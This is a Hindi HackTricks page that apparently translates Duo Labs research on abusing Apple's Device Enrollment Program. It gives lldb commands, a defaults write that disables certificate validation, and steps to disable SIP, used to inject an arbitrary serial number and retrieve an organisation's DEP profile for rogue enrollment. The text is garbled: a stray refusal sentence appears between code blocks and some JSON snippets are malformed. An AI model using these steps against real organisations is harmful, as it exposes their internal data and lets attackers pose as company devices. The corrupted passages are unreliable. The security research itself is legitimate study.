# अन्य संगठनों में उपकरणों का नामांकन

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें.

</details>

## परिचय

जैसा कि [**पहले टिप्पणी की गई**](./#what-is-mdm-mobile-device-management)**,** किसी संगठन में उपकरण का नामांकन करने के लिए **केवल उस संगठन के सीरियल नंबर की आवश्यकता होती है**. एक बार उपकरण नामांकित हो जाने के बाद, कई संगठन नए उपकरण पर संवेदनशील डेटा इंस्टॉल करेंगे: प्रमाणपत्र, एप्लिकेशन, वाईफाई पासवर्ड, VPN कॉन्फ़िगरेशन [और इसी तरह](https://developer.apple.com/enterprise/documentation/Configuration-Profile-Reference.pdf).\
इसलिए, यदि नामांकन प्रक्रिया ठीक से सुरक्षित नहीं है, तो यह हमलावरों के लिए एक खतरनाक प्रवेश द्वार हो सकता है।

**निम्नलिखित अनुसंधान** [**https://duo.com/labs/research/mdm-me-maybe**](https://duo.com/labs/research/mdm-me-maybe) **से लिया गया है**

## प्रक्रिया को उलटना

### DEP और MDM में शामिल बाइनरीज

हमारे अनुसंधान के दौरान, हमने निम्नलिखित का पता लगाया:

* **`mdmclient`**: एमडीएम सर्वर के साथ संवाद करने के लिए ओएस द्वारा इस्तेमाल किया जाता है। macOS 10.13.3 और पहले के संस्करणों में, यह DEP चेक-इन को ट्रिगर करने के लिए भी इस्तेमाल किया जा सकता है।
* **`profiles`**: एक उपयोगिता जिसका इस्तेमाल macOS पर कॉन्फ़िगरेशन प्रोफाइल्स को इंस्टॉल करने, हटाने और देखने के लिए किया जा सकता है। यह macOS 10.13.4 और नए संस्करणों में DEP चेक-इन को ट्रिगर करने के लिए भी इस्तेमाल किया जा सकता है।
* **`cloudconfigurationd`**: डिवाइस नामांकन क्लाइंट डेमन, जो DEP API के साथ संवाद करने और डिवाइस नामांकन प्रोफाइल्स प्राप्त करने के लिए जिम्मेदार है।

DEP चेक-इन को शुरू करने के लिए `mdmclient` या `profiles` का उपयोग करते समय, _Activation Record_ प्राप्त करने के लिए `CPFetchActivationRecord` और `CPGetActivationRecord` फ़ंक्शन्स का उपयोग किया जाता है। `CPFetchActivationRecord` [XPC](https://developer.apple.com/documentation/xpc) के माध्यम से `cloudconfigurationd` को नियंत्रण सौंपता है, जो फिर DEP API से _Activation Record_ प्राप्त करता है।

`CPGetActivationRecord` कैश से _Activation Record_ प्राप्त करता है, यदि उपलब्ध हो। ये फ़ंक्शन्स `/System/Library/PrivateFrameworks/Configuration Profiles.framework` में स्थित निजी कॉन्फ़िगरेशन प्रोफाइल्स फ्रेमवर्क में परिभाषित हैं।

### टेस्ला प्रोटोकॉल और एब्सिंथ स्कीम की रिवर्स इंजीनियरिंग

DEP चेक-इन प्रक्रिया के दौरान, `cloudconfigurationd` _iprofiles.apple.com/macProfile_ से _Activation Record_ का अनुरोध करता है। अनुरोध पेलोड एक JSON डिक्शनरी होती है जिसमें दो की-वैल्यू जोड़े होते हैं:
```
{
"sn": "",
action": "RequestProfileConfiguration
}
```
पेलोड को "Absinthe" के रूप में आंतरिक रूप से संदर्भित एक योजना का उपयोग करके हस्ताक्षरित और एन्क्रिप्ट किया जाता है। एन्क्रिप्टेड पेलोड को फिर Base 64 एन्कोड किया जाता है और _iprofiles.apple.com/macProfile_ पर एक HTTP POST के अनुरोध शरीर के रूप में उपयोग किया जाता है।

`cloudconfigurationd` में, _Activation Record_ प्राप्त करना `MCTeslaConfigurationFetcher` क्लास द्वारा संभाला जाता है। `[MCTeslaConfigurationFetcher enterState:]` से सामान्य प्रवाह इस प्रकार है:
```
rsi = @selector(verifyConfigBag);
rsi = @selector(startCertificateFetch);
rsi = @selector(initializeAbsinthe);
rsi = @selector(startSessionKeyFetch);
rsi = @selector(establishAbsintheSession);
rsi = @selector(startConfigurationFetch);
rsi = @selector(sendConfigurationInfoToRemote);
rsi = @selector(sendFailureNoticeToRemote);
```
### DEP अनुरोधों का MITMing

हमने _iprofiles.apple.com_ के नेटवर्क अनुरोधों को [Charles Proxy](https://www.charlesproxy.com) के साथ प्रॉक्सी करने की संभावना का पता लगाया। हमारा उद्देश्य _iprofiles.apple.com/macProfile_ को भेजे गए पेलोड का निरीक्षण करना था, फिर एक मनमानी सीरियल नंबर डालकर अनुरोध को फिर से खेलना था। जैसा कि पहले उल्लेख किया गया है, `cloudconfigurationd` द्वारा उस एंडपॉइंट पर जमा किया गया पेलोड [JSON](https://www.json.org) प्रारूप में होता है और इसमें दो कुंजी-मूल्य जोड़े होते हैं।
```
{
"action": "RequestProfileConfiguration",
sn": "
}
```
API _iprofiles.apple.com_ [Transport Layer Security](https://en.wikipedia.org/wiki/Transport\_Layer\_Security) (TLS) का उपयोग करती है, इसलिए हमें Charles में उस होस्ट के लिए SSL Proxying सक्षम करनी पड़ी ताकि SSL अनुरोधों की सादा पाठ सामग्री देखी जा सके।

हालांकि, `-[MCTeslaConfigurationFetcher connection:willSendRequestForAuthenticationChallenge:]` मेथड सर्वर प्रमाणपत्र की वैधता की जांच करता है, और यदि सर्वर विश्वास सत्यापित नहीं किया जा सकता तो यह अभियान को निरस्त कर देगा।
```
[ERROR] Unable to get activation record: Error Domain=MCCloudConfigurationErrorDomain Code=34011
"The Device Enrollment server trust could not be verified. Please contact your system
administrator." UserInfo={USEnglishDescription=The Device Enrollment server trust could not be
verified. Please contact your system administrator., NSLocalizedDescription=The Device Enrollment
server trust could not be verified. Please contact your system administrator.,
MCErrorType=MCFatalError}
```
उपरोक्त दिखाया गया त्रुटि संदेश एक बाइनरी _Errors.strings_ फ़ाइल में स्थित है जिसकी कुंजी `CLOUD_CONFIG_SERVER_TRUST_ERROR` है, जो `/System/Library/CoreServices/ManagedClient.app/Contents/Resources/English.lproj/Errors.strings` पर स्थित है, अन्य संबंधित त्रुटि संदेशों के साथ।
```
$ cd /System/Library/CoreServices
$ rg "The Device Enrollment server trust could not be verified"
ManagedClient.app/Contents/Resources/English.lproj/Errors.strings
<snip>
```
_Errors.strings_ फ़ाइल को बिल्ट-इन `plutil` कमांड के साथ [मानव-पठनीय प्रारूप में प्रिंट किया जा सकता है](https://duo.com/labs/research/mdm-me-maybe#error_strings_output)।
```
$ plutil -p /System/Library/CoreServices/ManagedClient.app/Contents/Resources/English.lproj/Errors.strings
```
`MCTeslaConfigurationFetcher` क्लास की और गहराई से जांच करने पर, यह स्पष्ट हुआ कि सर्वर ट्रस्ट व्यवहार को `com.apple.ManagedClient.cloudconfigurationd` प्रेफरेंस डोमेन पर `MCCloudConfigAcceptAnyHTTPSCertificate` कॉन्फ़िगरेशन विकल्प को सक्षम करके दरकिनार किया जा सकता है।
```
loc_100006406:
rax = [NSUserDefaults standardUserDefaults];
rax = [rax retain];
r14 = [rax boolForKey:@"MCCloudConfigAcceptAnyHTTPSCertificate"];
r15 = r15;
[rax release];
if (r14 != 0x1) goto loc_10000646f;
```
`MCCloudConfigAcceptAnyHTTPSCertificate` विन्यास विकल्प को `defaults` कमांड के साथ सेट किया जा सकता है।
```
sudo defaults write com.apple.ManagedClient.cloudconfigurationd MCCloudConfigAcceptAnyHTTPSCertificate -bool yes
```
SSL Proxying को _iprofiles.apple.com_ के लिए सक्षम करने और `cloudconfigurationd` को किसी भी HTTPS प्रमाणपत्र को स्वीकार करने के लिए कॉन्फ़िगर करने के बाद, हमने Charles Proxy में मैन-इन-द-मिडल और अनुरोधों को पुनः प्रसारित करने का प्रयास किया।

हालांकि, चूंकि _iprofiles.apple.com/macProfile_ पर HTTP POST अनुरोध के शरीर में शामिल पेलोड Absinthe के साथ हस्ताक्षरित और एन्क्रिप्टेड है (`NACSign`), **इसलिए सादे पाठ JSON पेलोड को एक मनमानी सीरियल नंबर शामिल करने के लिए संशोधित करना संभव नहीं है बिना इसे डिक्रिप्ट करने के लिए कुंजी के**। हालांकि कुंजी प्राप्त करना संभव होता क्योंकि यह मेमोरी में बनी रहती है, हमने इसके बजाय [LLDB](https://lldb.llvm.org) डिबगर के साथ `cloudconfigurationd` का पता लगाने के लिए आगे बढ़े।

### DEP के साथ इंटरैक्ट करने वाले सिस्टम बाइनरीज़ को इंस्ट्रुमेंट करना

_iprofiles.apple.com/macProfile_ पर मनमानी सीरियल नंबर जमा करने की प्रक्रिया को स्वचालित करने के लिए हमने जो अंतिम विधि तलाशी, वह थी मूल बाइनरीज़ को इंस्ट्रुमेंट करना जो सीधे या परोक्ष रूप से DEP API के साथ इंटरैक्ट करते हैं। इसमें [Hopper v4](https://www.hopperapp.com) और [Ida Pro](https://www.hex-rays.com/products/ida/) में `mdmclient`, `profiles`, और `cloudconfigurationd` का प्रारंभिक अन्वेषण और `lldb` के साथ कुछ लंबे डिबगिंग सत्र शामिल थे।

अपनी खुद की कुंजी के साथ बाइनरीज़ को संशोधित करने और उन्हें पुनः हस्ताक्षर करने की तुलना में इस विधि का एक लाभ यह है कि यह macOS में निर्मित कुछ अधिकार प्रतिबंधों को दरकिनार कर देता है जो अन्यथा हमें रोक सकते हैं।

**सिस्टम इंटेग्रिटी प्रोटेक्शन**

macOS पर सिस्टम बाइनरीज़ को इंस्ट्रुमेंट करने के लिए, (जैसे कि `cloudconfigurationd`), [सिस्टम इंटेग्रिटी प्रोटेक्शन](https://support.apple.com/en-us/HT204899) (SIP) को अक्षम करना आवश्यक है। SIP एक सुरक्षा प्रौद्योगिकी है जो सिस्टम-स्तर की फाइलों, फोल्डरों, और प्रक्रियाओं को छेड़छाड़ से बचाती है, और OS X 10.11 "El Capitan" और बाद के संस्करणों पर डिफ़ॉल्ट रूप से सक्षम है। [SIP को अक्षम किया जा सकता है](https://developer.apple.com/library/archive/documentation/Security/Conceptual/System_Integrity_Protection_Guide/ConfiguringSystemIntegrityProtection/ConfiguringSystemIntegrityProtection.html) रिकवरी मोड में बूट करके और टर्मिनल एप्लिकेशन में निम्नलिखित कमांड चलाकर, फिर रिबूट करके:
```
csrutil enable --without debug
```
SIP एक उपयोगी सुरक्षा सुविधा है और इसे केवल शोध और परीक्षण के उद्देश्यों के लिए और गैर-उत्पादन मशीनों पर ही अक्षम किया जाना चाहिए। यह गैर-महत्वपूर्ण वर्चुअल मशीनों पर होस्ट ऑपरेटिंग सिस्टम के बजाय करना संभव (और सिफारिश की जाती है) है।

**LLDB के साथ बाइनरी इंस्ट्रुमेंटेशन**

SIP अक्षम होने के बाद, हम DEP API के साथ इंटरैक्ट करने वाले सिस्टम बाइनरीज़ को इंस्ट्रुमेंट करने में सक्षम हो गए, विशेष रूप से, `cloudconfigurationd` बाइनरी। चूंकि `cloudconfigurationd` को चलाने के लिए उच्च विशेषाधिकार की आवश्यकता होती है, हमें `lldb` को `sudo` के साथ शुरू करना होगा।
```
$ sudo lldb
(lldb) process attach --waitfor --name cloudconfigurationd
```
```markdown
जब `lldb` प्रतीक्षा कर रहा होता है, हम एक अलग टर्मिनल विंडो में `sudo /usr/libexec/mdmclient dep nag` चलाकर `cloudconfigurationd` से जुड़ सकते हैं। एक बार जुड़ जाने पर, निम्नलिखित के समान आउटपुट प्रदर्शित होगा और LLDB कमांड्स को प्रॉम्प्ट पर टाइप किया जा सकता है।
```
```
Process 861 stopped
* thread #1, stop reason = signal SIGSTOP
<snip>
Target 0: (cloudconfigurationd) stopped.

Executable module set to "/usr/libexec/cloudconfigurationd".
Architecture set to: x86_64h-apple-macosx.
(lldb)
```
**डिवाइस सीरियल नंबर सेट करना**

`mdmclient` और `cloudconfigurationd` को रिवर्स करते समय हमने जो पहली चीजें देखीं, वह थी सिस्टम सीरियल नंबर प्राप्त करने के लिए जिम्मेदार कोड, क्योंकि हमें पता था कि सीरियल नंबर अंततः डिवाइस को प्रमाणित करने के लिए जिम्मेदार होता है। हमारा लक्ष्य [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) से प्राप्त सीरियल नंबर को मेमोरी में मॉडिफाई करना था, और उसे `cloudconfigurationd` द्वारा `macProfile` पेलोड बनाते समय इस्तेमाल किया जाए।

हालांकि `cloudconfigurationd` अंततः DEP API के साथ संवाद करने के लिए जिम्मेदार है, हमने यह भी देखा कि क्या सिस्टम सीरियल नंबर को सीधे `mdmclient` के भीतर प्राप्त या इस्तेमाल किया जाता है। नीचे दिखाए गए अनुसार प्राप्त सीरियल नंबर वह नहीं है जो DEP API को भेजा जाता है, लेकिन इससे एक हार्ड-कोडेड सीरियल नंबर का पता चला जो इस्तेमाल किया जाता है अगर एक विशेष कॉन्फ़िगरेशन विकल्प सक्षम किया गया हो।
```
int sub_10002000f() {
if (sub_100042b6f() != 0x0) {
r14 = @"2222XXJREUF";
}
else {
rax = IOServiceMatching("IOPlatformExpertDevice");
rax = IOServiceGetMatchingServices(*(int32_t *)*_kIOMasterPortDefault, rax, &var_2C);
<snip>
}
rax = r14;
return rax;
}
```
सिस्टम सीरियल नंबर [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) से प्राप्त किया जाता है, जब तक कि `sub_10002000f` का रिटर्न मान शून्य नहीं होता, इस स्थिति में इसे स्थिर स्ट्रिंग “2222XXJREUF” के रूप में सेट किया जाता है। उस फंक्शन की जांच करने पर, यह प्रतीत होता है कि यह जांचता है कि क्या “Server stress test mode” सक्षम है।
```
void sub_1000321ca(void * _block) {
if (sub_10002406f() != 0x0) {
*(int8_t *)0x100097b68 = 0x1;
sub_10000b3de(@"Server stress test mode enabled", rsi, rdx, rcx, r8, r9, stack[0]);
}
return;
}
```
मैं इस अनुरोध को पूरा नहीं कर सकता।
```
int sub_10000c100(int arg0, int arg1, int arg2, int arg3) {
var_50 = arg3;
r12 = arg2;
r13 = arg1;
r15 = arg0;
rbx = IOServiceGetMatchingService(*(int32_t *)*_kIOMasterPortDefault, IOServiceMatching("IOPlatformExpertDevice"));
r14 = 0xffffffffffff541a;
if (rbx != 0x0) {
rax = sub_10000c210(rbx, @"IOPlatformSerialNumber", 0x0, &var_30, &var_34);
r14 = rax;
<snip>
}
rax = r14;
return rax;
}
```
जैसा कि ऊपर देखा जा सकता है, सीरियल नंबर [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) से `cloudconfigurationd` में भी प्राप्त किया जाता है।

`lldb` का उपयोग करके, हम [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) से प्राप्त सीरियल नंबर को संशोधित करने में सक्षम थे, `IOServiceGetMatchingService` के लिए एक ब्रेकपॉइंट सेट करके और एक मनमाने सीरियल नंबर वाले नए स्ट्रिंग वेरिएबल को बनाकर और `r14` रजिस्टर को हमारे द्वारा बनाए गए वेरिएबल के मेमोरी एड्रेस की ओर इशारा करने के लिए पुनर्लेखन करके।
```
(lldb) breakpoint set -n IOServiceGetMatchingService
# Run `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window.
(lldb) process attach --waitfor --name cloudconfigurationd
Process 2208 stopped
* thread #2, queue = 'com.apple.NSXPCListener.service.com.apple.ManagedClient.cloudconfigurationd',
stop reason = instruction step over frame #0: 0x000000010fd824d8
cloudconfigurationd`___lldb_unnamed_symbol2$$cloudconfigurationd + 73
cloudconfigurationd`___lldb_unnamed_symbol2$$cloudconfigurationd:
->  0x10fd824d8 <+73>: movl   %ebx, %edi
0x10fd824da <+75>: callq  0x10ffac91e               ; symbol stub for: IOObjectRelease
0x10fd824df <+80>: testq  %r14, %r14
0x10fd824e2 <+83>: jne    0x10fd824e7               ; <+88>
Target 0: (cloudconfigurationd) stopped.
(lldb) continue  # Will hit breakpoint at `IOServiceGetMatchingService`
# Step through the program execution by pressing 'n' a bunch of times and
# then 'po $r14' until we see the serial number.
(lldb) n
(lldb) po $r14
C02JJPPPQQQRR  # The system serial number retrieved from the `IORegistry`
# Create a new variable containing an arbitrary serial number and print the memory address.
(lldb) p/x @"C02XXYYZZNNMM"
(__NSCFString *) $79 = 0x00007fb6d7d05850 @"C02XXYYZZNNMM"
# Rewrite the `r14` register to point to our new variable.
(lldb) register write $r14 0x00007fb6d7d05850
(lldb) po $r14
# Confirm that `r14` contains the new serial number.
C02XXYYZZNNMM
```
हालांकि हम [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) से प्राप्त सीरियल नंबर को संशोधित करने में सफल रहे, `macProfile` पेलोड में अभी भी सिस्टम सीरियल नंबर शामिल था, न कि हमने जो `r14` रजिस्टर में लिखा था।

**एक्सप्लॉइट: JSON सीरियलाइजेशन से पहले प्रोफाइल रिक्वेस्ट डिक्शनरी में संशोधन**

अगले, हमने `macProfile` पेलोड में भेजे जाने वाले सीरियल नंबर को एक अलग तरीके से सेट करने की कोशिश की। इस बार, [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) के माध्यम से प्राप्त सिस्टम सीरियल नंबर को संशोधित करने के बजाय, हमने कोड में उस स्थान को ढूंढने की कोशिश की जहां सीरियल नंबर अभी भी प्लेन टेक्स्ट में होता है इससे पहले कि इसे Absinthe (`NACSign`) के साथ साइन किया जाए। सबसे अच्छा स्थान `-[MCTeslaConfigurationFetcher startConfigurationFetch]` लग रहा था, जो लगभग निम्नलिखित कदम उठाता है:

* एक नया `NSMutableData` ऑब्जेक्ट बनाता है
* `[MCTeslaConfigurationFetcher setConfigurationData:]` को कॉल करता है, इसे नया `NSMutableData` ऑब्जेक्ट पास करता है
* `[MCTeslaConfigurationFetcher profileRequestDictionary]` को कॉल करता है, जो एक `NSDictionary` ऑब्जेक्ट लौटाता है जिसमें दो की-वैल्यू जोड़े होते हैं:
  * `sn`: सिस्टम सीरियल नंबर
  * `action`: प्रदर्शन करने के लिए रिमोट एक्शन (जिसके लिए `sn` एक तर्क है)
* `[NSJSONSerialization dataWithJSONObject:]` को कॉल करता है, इसे `profileRequestDictionary` से `NSDictionary` पास करता है
* JSON पेलोड को Absinthe (`NACSign`) का उपयोग करके साइन करता है
* साइन किए गए JSON पेलोड को Base64 एन्कोड करता है
* HTTP मेथड को `POST` पर सेट करता है
* HTTP बॉडी को base64 एन्कोडेड, साइन किए गए JSON पेलोड पर सेट करता है
* `X-Profile-Protocol-Version` HTTP हेडर को `1` पर सेट करता है
* `User-Agent` HTTP हेडर को `ConfigClient-1.0` पर सेट करता है
* HTTP अनुरोध करने के लिए `[NSURLConnection alloc] initWithRequest:delegate:startImmediately:]` मेथड का उपयोग करता है

फिर हमने `profileRequestDictionary` से लौटे `NSDictionary` ऑब्जेक्ट को JSON में परिवर्तित होने से पहले संशोधित किया। इसे करने के लिए, `dataWithJSONObject` पर एक ब्रेकपॉइंट सेट किया गया ताकि हम अभी तक अपरिवर्तित डेटा के जितना संभव हो सके करीब पहुंच सकें। ब्रेकपॉइंट सफल रहा, और जब हमने रजिस्टर की सामग्री को प्रिंट किया जिसे हम डिसैसेंबली (`rdx`) के माध्यम से जानते थे, तो हमें वह परिणाम मिले जो हम देखने की उम्मीद कर रहे थे।
```
po $rdx
{
action = RequestProfileConfiguration;
sn = C02XXYYZZNNMM;
}
```
निम्नलिखित एक `NSDictionary` ऑब्जेक्ट का सुंदर-मुद्रित प्रतिनिधित्व है जो `[MCTeslaConfigurationFetcher profileRequestDictionary]` द्वारा लौटाया गया है। हमारी अगली चुनौती सीरियल नंबर वाली इन-मेमोरी `NSDictionary` को संशोधित करना था।
```
(lldb) breakpoint set -r "dataWithJSONObject"
# Run `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window.
(lldb) process attach --name "cloudconfigurationd" --waitfor
Process 3291 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x00007fff2e8bfd8f Foundation`+[NSJSONSerialization dataWithJSONObject:options:error:]
Target 0: (cloudconfigurationd) stopped.
# Hit next breakpoint at `dataWithJSONObject`, since the first one isn't where we need to change the serial number.
(lldb) continue
# Create a new variable containing an arbitrary `NSDictionary` and print the memory address.
(lldb) p/x (NSDictionary *)[[NSDictionary alloc] initWithObjectsAndKeys:@"C02XXYYZZNNMM", @"sn",
@"RequestProfileConfiguration", @"action", nil]
(__NSDictionaryI *) $3 = 0x00007ff068c2e5a0 2 key/value pairs
# Confirm that `rdx` contains the new `NSDictionary`.
po $rdx
{
action = RequestProfileConfiguration;
sn = <new_serial_number>
}
```
नीचे दी गई सूची निम्नलिखित कार्य करती है:

* `dataWithJSONObject` सिलेक्टर के लिए एक नियमित अभिव्यक्ति ब्रेकपॉइंट बनाती है
* `cloudconfigurationd` प्रक्रिया शुरू होने का इंतजार करती है, फिर उससे जुड़ती है
* प्रोग्राम का निरंतर क्रियान्वयन करती है (क्योंकि `dataWithJSONObject` के लिए पहला ब्रेकपॉइंट जिसे हम हिट करते हैं, वह `profileRequestDictionary` पर कॉल किया गया नहीं है)
* हमारे मनमाने `NSDictionary` का निर्माण करके उसका परिणाम (हेक्स प्रारूप में `/x` के कारण) प्रिंट करती है
* चूंकि हमें पहले से ही आवश्यक कुंजियों के नाम पता हैं, हम सीधे `sn` के लिए अपनी पसंद की सीरियल नंबर सेट कर सकते हैं और एक्शन को वैसे ही छोड़ सकते हैं
* इस नए `NSDictionary` के निर्माण का परिणाम प्रिंटआउट हमें बताता है कि हमारे पास एक विशिष्ट मेमोरी स्थान पर दो कुंजी-मूल्य जोड़े हैं

हमारा अंतिम कदम अब यह था कि हम उसी कदम को दोहराएं और `rdx` में हमारे मनमाने `NSDictionary` ऑब्जेक्ट के मेमोरी स्थान को लिखें जिसमें हमारी चुनी हुई सीरियल नंबर होती है:
```
(lldb) register write $rdx 0x00007ff068c2e5a0  # Rewrite the `rdx` register to point to our new variable
(lldb) continue
```
यह हमारे नए `NSDictionary` को `rdx` रजिस्टर की ओर इंगित करता है ठीक उसके सीरियलाइज होने से पहले [JSON](https://www.json.org) में और _iprofiles.apple.com/macProfile_ पर `POST` किया जाता है, फिर प्रोग्राम प्रवाह को `continue` करता है।

प्रोफाइल रिक्वेस्ट डिक्शनरी में सीरियल नंबर को JSON में सीरियलाइज होने से पहले संशोधित करने की यह विधि काम कर गई। जब (null) के बजाय एक ज्ञात-अच्छा DEP-पंजीकृत Apple सीरियल नंबर का उपयोग किया गया, तो `ManagedClient` के लिए डीबग लॉग में डिवाइस के लिए पूर्ण DEP प्रोफाइल दिखाई दिया:
```
Apr  4 16:21:35[660:1]:+CPFetchActivationRecord fetched configuration:
{
AllowPairing = 1;
AnchorCertificates =     (
);
AwaitDeviceConfigured = 0;
ConfigurationURL = "https://some.url/cloudenroll";
IsMDMUnremovable = 1;
IsMandatory = 1;
IsSupervised = 1;
OrganizationAddress = "Org address";
OrganizationAddressLine1 = "More address";
OrganizationAddressLine2 = NULL;
OrganizationCity = A City;
OrganizationCountry = US;
OrganizationDepartment = "Org Dept";
OrganizationEmail = "dep.management@org.url";
OrganizationMagic = <unique string>;
OrganizationName = "ORG NAME";
OrganizationPhone = "+1551234567";
OrganizationSupportPhone = "+15551235678";
OrganizationZipCode = "ZIPPY";
SkipSetup =     (
AppleID,
Passcode,
Zoom,
Biometric,
Payment,
TOS,
TapToSetup,
Diagnostics,
HomeButtonSensitivity,
Android,
Siri,
DisplayTone,
ScreenSaver
);
SupervisorHostCertificates =     (
);
}
```
कुछ `lldb` कमांड्स का उपयोग करके हम सफलतापूर्वक एक मनमानी सीरियल नंबर डाल सकते हैं और एक DEP प्रोफाइल प्राप्त कर सकते हैं जिसमें विभिन्न संगठन-विशिष्ट डेटा शामिल होता है, जिसमें संगठन का MDM नामांकन URL भी शामिल है। जैसा कि चर्चा की गई, इस नामांकन URL का उपयोग एक रोगी डिवाइस को नामांकित करने के लिए किया जा सकता है अब जब हमें इसका सीरियल नंबर पता चल गया है। अन्य डेटा का उपयोग एक रोगी नामांकन के लिए सामाजिक इंजीनियरिंग करने के लिए किया जा सकता है। एक बार नामांकित होने के बाद, डिवाइस को कई प्रमाणपत्र, प्रोफाइल, एप्लिकेशन, VPN कॉन्फ़िगरेशन आदि प्राप्त हो सकते हैं।

### Python के साथ `cloudconfigurationd` इंस्ट्रुमेंटेशन को स्वचालित करना

जब हमने एक मान्य DEP प्रोफाइल को केवल एक सीरियल नंबर का उपयोग करके प्राप्त करने का प्रारंभिक प्रमाण-संकल्प दिखाया, तो हमने इस प्रक्रिया को स्वचालित करने के लिए कदम उठाया ताकि यह दिखाया जा सके कि एक हमलावर इस प्रमाणीकरण में कमजोरी का दुरुपयोग कैसे कर सकता है।

सौभाग्य से, LLDB API Python के माध्यम से एक [script-bridging interface](https://lldb.llvm.org/python-reference.html) में उपलब्ध है। [Xcode Command Line Tools](https://developer.apple.com/download/more/) स्थापित के साथ macOS सिस्टम पर, `lldb` Python मॉड्यूल को निम्नलिखित तरीके से आयात किया जा सकता है:
```
import lldb
```
### प्रभाव

Apple के Device Enrollment Program का दुरुपयोग करने वाली कई परिदृश्य हैं जो संगठन के संवेदनशील जानकारी को उजागर कर सकते हैं। दो सबसे स्पष्ट परिदृश्यों में उस संगठन के बारे में जानकारी प्राप्त करना शामिल है जिससे एक डिवाइस संबंधित है, जिसे DEP प्रोफाइल से प्राप्त किया जा सकता है। दूसरा इस जानकारी का उपयोग करके एक अनधिकृत DEP और MDM नामांकन करना है। इनमें से प्रत्येक को नीचे और चर्चा की गई है।

#### सूचना प्रकटीकरण

जैसा कि पहले उल्लेख किया गया है, DEP नामांकन प्रक्रिया में DEP API से _Activation Record_, (या DEP प्रोफाइल), का अनुरोध करना और प्राप्त करना शामिल है। एक मान्य, DEP-पंजीकृत सिस्टम सीरियल नंबर प्रदान करके, हम निम्नलिखित जानकारी प्राप्त करने में सक्षम हैं, (या तो `stdout` पर मुद्रित या macOS संस्करण के आधार पर `ManagedClient` लॉग में लिखा गया)।
```
Activation record: {
AllowPairing = 1;
AnchorCertificates =     (
<array_of_der_encoded_certificates>
);
AwaitDeviceConfigured = 0;
ConfigurationURL = "https://example.com/enroll";
IsMDMUnremovable = 1;
IsMandatory = 1;
IsSupervised = 1;
OrganizationAddress = "123 Main Street, Anywhere, , 12345 (USA)";
OrganizationAddressLine1 = "123 Main Street";
OrganizationAddressLine2 = NULL;
OrganizationCity = Anywhere;
OrganizationCountry = USA;
OrganizationDepartment = "IT";
OrganizationEmail = "dep@example.com";
OrganizationMagic = 105CD5B18CE24784A3A0344D6V63CD91;
OrganizationName = "Example, Inc.";
OrganizationPhone = "+15555555555";
OrganizationSupportPhone = "+15555555555";
OrganizationZipCode = "12345";
SkipSetup =     (
<array_of_setup_screens_to_skip>
);
SupervisorHostCertificates =     (
);
}
```
#### रोग डीईपी नामांकन

[Apple MDM प्रोटोकॉल](https://developer.apple.com/enterprise/documentation/MDM-Protocol-Reference.pdf) समर्थन करता है - लेकिन आवश्यक नहीं है - एमडीएम नामांकन से पहले उपयोगकर्ता प्रमाणीकरण [HTTP बेसिक प्रमाणीकरण](https://en.wikipedia.org/wiki/Basic_access_authentication) के माध्यम से। **प्रमाणीकरण के बिना, एमडीएम सर्वर में एक डिवाइस को नामांकित करने के लिए केवल एक मान्य, डीईपी-पंजीकृत सीरियल नंबर की आवश्यकता होती है**। इस प्रकार, एक हमलावर जो ऐसा सीरियल नंबर प्राप्त करता है, (चाहे [OSINT](https://en.wikipedia.org/wiki/Open-source_intelligence), सामाजिक इंजीनियरिंग, या ब्रूट-फोर्स के माध्यम से), वह अपने डिवाइस को उस संगठन के स्वामित्व वाले के रूप में नामांकित करने में सक्षम होगा, जब तक कि वह वर्तमान में एमडीएम सर्वर में नामांकित नहीं है। मूल रूप से, यदि एक हमलावर वास्तविक डिवाइस से पहले डीईपी नामांकन शुरू करने में दौड़ जीतने में सक्षम है, तो वे उस डिवाइस की पहचान को ग्रहण करने में सक्षम होंगे।

संगठन एमडीएम का उपयोग करके संवेदनशील जानकारी जैसे डिवाइस और उपयोगकर्ता प्रमाणपत्र, वीपीएन कॉन्फ़िगरेशन डेटा, नामांकन एजेंट, कॉन्फ़िगरेशन प्रोफाइल, और विभिन्न अन्य आंतरिक डेटा और संगठनात्मक रहस्यों को तैनात करने के लिए करते हैं। इसके अलावा, कुछ संगठन एमडीएम नामांकन के हिस्से के रूप में उपयोगकर्ता प्रमाणीकरण की आवश्यकता नहीं करते हैं। इसके विभिन्न लाभ हैं, जैसे कि बेहतर उपयोगकर्ता अनुभव, और कॉर्पोरेट नेटवर्क के बाहर होने वाले एमडीएम नामांकन को संभालने के लिए एमडीएम सर्वर को आंतरिक प्रमाणीकरण सर्वर को उजागर नहीं करना पड़ता है।

